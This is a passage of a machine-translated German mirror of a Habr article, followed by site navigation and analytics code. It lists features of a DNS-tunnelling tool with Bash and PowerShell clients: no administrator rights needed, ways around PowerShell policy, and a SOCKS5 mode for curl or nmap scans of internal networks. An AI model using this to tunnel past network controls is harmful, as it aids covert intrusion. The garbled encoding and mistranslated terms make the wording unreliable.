Funktionen hat diese Entwicklung und warum empfehlen wir die Verwendung? </p><br><ol><li>  Interpretierte Kunden auf Bash und Powershell: Keine EXE-Shnikov und ELF-s, deren Ausf√ºhrung schwierig sein kann. </li><li>  Verbindungsstabilit√§t: In den Tests verhielt sich unser Dienstprogramm viel stabiler, und wenn es Fehler gab, konnten Sie die Verbindung einfach wieder herstellen, w√§hrend der Client nicht abst√ºrzte, wie dies beispielsweise bei dnscat2 der Fall war. </li><li>  Ziemlich hohe Geschwindigkeit f√ºr den DNS-Tunnel: Nat√ºrlich erreicht die Geschwindigkeit kein Jod, aber es gibt eine viel niedrigere kompilierte L√∂sung. </li><li>  Es sind keine Administratorrechte erforderlich: Der Bash-Client funktioniert ohne Administratorrechte, und Powershell-Skripte sind manchmal durch Sicherheitsrichtlinien verboten, dies ist jedoch recht einfach. </li><li>  Es gibt einen socks5-Proxy-Modus, mit dem Sie <code>curl -v --socks5 127.0.0.1:9011 https://ident.me</code> oder nmap im gesamten internen Netzwerk ausf√ºhren k√∂nnen. </li></ol><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Der Dienstprogrammcode ist hier verf√ºgbar.</a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de432078/">https://habr.com/ru/post/de432078/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de432068/index.html">So erleichtern Sie das Englischlernen: 5 n√ºtzliche Dienste</a></li>
<li><a href="../de432070/index.html">Kurz √ºber Redux-Saga-Kan√§le</a></li>
<li><a href="../de432072/index.html">Drei Arten von Speicherlecks</a></li>
<li><a href="../de432074/index.html">Wie Spieler Spelunky Reality-Stoff mit Schrotflinten zerrei√üen</a></li>
<li><a href="../de432076/index.html">Eine nicht erkannte Funktion verlangsamt das Programm f√ºnfmal</a></li>
<li><a href="../de432080/index.html">Missverst√§ndnisse der Spieler bei der Bewertung von Risiken. Steuerung des Zufallszahlengenerators in Entwicklung</a></li>
<li><a href="../de432082/index.html">Microsoft AI Chatbot startet China Clothing Collection</a></li>
<li><a href="../de432084/index.html">Wie wir einen Schichtwettbewerb zwischen Produktionsarbeitern arrangiert haben (wie in der UdSSR)</a></li>
<li><a href="../de432086/index.html">3D-Druck an der nach M.V. Lomonosov benannten internationalen Schule</a></li>
<li><a href="../de432088/index.html">MySQL-Hochverf√ºgbarkeit auf GitHub</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>